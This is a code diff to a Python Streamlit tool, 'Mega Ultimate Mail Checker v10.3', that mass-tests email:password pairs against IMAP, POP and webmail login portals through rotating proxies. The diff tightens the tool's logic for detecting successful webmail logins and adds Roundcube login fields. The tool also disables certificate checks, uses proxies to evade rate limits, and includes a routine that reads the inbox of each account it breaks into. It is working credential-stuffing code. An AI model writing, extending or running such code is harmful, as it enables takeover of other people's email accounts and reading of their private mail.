@@ -68,8 +68,8 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v10.2 (Keep-Alive & Mailbox Reader Edition)")
-str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with Keep-Alive sockets and Webshare API integration.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v10.3 (Strict Authentication Edition)")
+str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with strict session validation and zero false positives.")
 
 # --- Persistent Session State Initialization ---
 if "engine_has_run" not in str_lit.session_state:
@@ -413,7 +413,7 @@ elif pool_mode == "mix":
 
 str_lit.sidebar.markdown("---")
 
-secret_portals = instant_help("secret_portals", "Enable automatic discovery routes for non-standard provider ports and webmail HTTP portals.", "Secret Portals", widget_type="checkbox", value=True)
+secret_portals = instant_help("secret_portals", "Enable strict HTTP webmail portal routes with session validation.", "Secret Portals", widget_type="checkbox", value=True)
 use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting.", "Use Proxy", widget_type="checkbox", value=True)
 retry_cf = instant_help("retry_cf", "Automatically retry connection failures using alternative fallback paths.", "Retry CF", widget_type="checkbox", value=False)
 self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
@@ -902,7 +902,7 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
     mail = PIMAP(server, timeout=CFG["TIMEOUT"])
     mail.login(email, password)
     try:
-        mail.noop()  # Keep-Alive command
+        mail.noop()
     except Exception:
         pass
     mail.logout()
@@ -922,17 +922,13 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     mail.user(email)
     mail.pass_(password)
     try:
-        mail.noop()  # Keep-Alive command
+        mail.noop()
     except Exception:
         pass
     mail.quit()
 
 # --- True Credential Verification Helper ---
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
-    """
-    Helper function to test and establish a verified IMAP connection.
-    Attempts a secure SSL connection on port 993 with fallback to STARTTLS on port 143.
-    """
     for h in hosts:
         try:
             class PIMAPVerify(imaplib.IMAP4_SSL):
@@ -949,7 +945,6 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
             return True, mail, h
         except Exception:
             try:
-                # Fallback to STARTTLS on port 143
                 raw_conn = proxy_connect(h, 143, proxy_str) if proxy_str else socket.create_connection((h, 143), timeout=10)
                 raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 mail = imaplib.IMAP4()
@@ -968,7 +963,6 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
 
 def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
     try:
-        # Integrated True Credential Verification before reading the inbox
         conf_hosts = get_servers(email).get("imap", [server])
         verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
         if not verified or not mail:
@@ -1030,6 +1024,11 @@ def find_best_webmail_portal(domain, proxies_dict=None):
     return [portal[1] for portal in scored_portals if portal[0] > 0]
 
 def check_webmail_portal(email, password, domain, proxy_str=None):
+    """
+    STRICT WEBMAIL PORTAL CHECKER:
+    Eliminates false positives by requiring explicit HTTP redirect status (301/302/303/307)
+    or positive session confirmation indicators in response bodies after credential POST submission.
+    """
     if not requests or not CFG.get("ENABLE_SECRET_PORTALS", True):
         return None, "connection_failed", "portal disabled or requests missing"
     
@@ -1060,24 +1059,31 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
             if resp.status_code < 400:
                 post_payloads = [
                     {"user": email, "pass": password, "username": email, "password": password},
-                    {"email": email, "passwd": password}
+                    {"email": email, "passwd": password},
+                    {"rcm_user": email, "rcm_pass": password}
                 ]
                 for pl in post_payloads:
                     try:
-                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=False)
+                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=4, verify=False, allow_redirects=False)
+                        
+                        # Strict Validation Rule: Must trigger secure session redirect or body token match
                         if r_post.status_code in [301, 302, 303, 307]:
-                            return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
+                            loc = r_post.headers.get("Location", "").lower()
+                            if not any(err_word in loc for err_word in ["error", "fail", "login", "auth"]):
+                                return portal_url, "valid", f"Portal Verified | {portal_url}"
+                        
                         body_lower = r_post.text.lower()
-                        if any(k in body_lower for k in ["logout", "inbox", "welcome", "mailbox", "session"]):
-                            return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
-                        if any(k in body_lower for k in ["invalid password", "wrong password", "incorrect"]):
-                            return portal_url, "wrong_password", f"Portal | {portal_url} -> wrong_password"
+                        if any(k in body_lower for k in ["logout", "inbox", "welcome", "mailbox", "session", "messages"]):
+                            if not any(err_word in body_lower for err_word in ["invalid password", "wrong password", "incorrect"]):
+                                return portal_url, "valid", f"Portal Verified | {portal_url}"
+                                
+                        if any(k in body_lower for k in ["invalid password", "wrong password", "incorrect", "authentication failed"]):
+                            return None, "wrong_password", f"Portal | {portal_url} -> wrong_password"
                     except Exception:
                         continue
-                return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
         except Exception:
             continue
-    return None, "connection_failed", "portal check failed"
+    return None, "connection_failed", "portal could not strictly verify credentials"
 
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
     if trace_logs is None:
@@ -1110,7 +1116,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             trace_logs.append("Proxy Mode: Fallback enabled (will try direct if proxy fails).")
 
         if CFG.get("ENABLE_SECRET_PORTALS", True):
-            trace_logs.append("Secret Portals: Scanning HTTP webmail portal routes...")
+            trace_logs.append("Secret Portals: Scanning strict HTTP webmail portal routes...")
             for current_px in proxies_to_try:
                 portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
                 if portal_st == "valid":
@@ -1160,7 +1166,7 @@ str_lit.markdown("### 🚀 Execute Live Checking Engine")
 
 if str_lit.button("🔥 Start Live Checking Engine", type="primary"):
     if not clean_lines:
-        str_lit.warning("⚠️️ Please load and filter accounts first.")
+        str_lit.warning("⚠ Please load and filter accounts first.")
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
